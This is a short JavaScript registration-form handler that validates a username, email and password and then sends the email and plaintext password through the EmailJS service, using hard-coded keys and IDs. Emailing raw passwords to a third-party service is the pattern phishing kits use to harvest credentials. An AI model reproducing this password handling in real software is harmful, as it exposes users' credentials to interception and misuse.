function RegistrationForm() 
{    
    var name = document.getElementById("name").value;
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    var Validname = /^[a-zA-Z0-9_]+$/;
    if (!Validname.test(name)) 
    {
        alert("Username can only contain letters, numbers, and underscores (_).");
        return;
    }
    alert("Username is valid!");


    if (!name || !email || !password) 
    {
        alert("Please fill name, email and password.");
        return;
    }
    
    var Validemail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!Validemail.test(email)) 
    {
        alert("Please enter a valid email address.");
        return;
    }

    if (password.length < 6)
    {
        alert("Password must be at least 6 characters long.");
        return;
    }
        
    var templateParams = 
    {
        email: email,
        password: password
    };
    emailjs.init('Jr7DIXpE0WAUH0MKW');
    emailjs.send('service_lcb7ayp', 'template_9sdbtpn', templateParams).then(function(response) 
    {
        alert("Login details sent successfully!");
        console.log('Email sent successfully:', response);
    })
    .catch(function(error) 
    {
        alert("Failed to send login details. Please try again.");
        console.log('Error:', error);
    });
  }
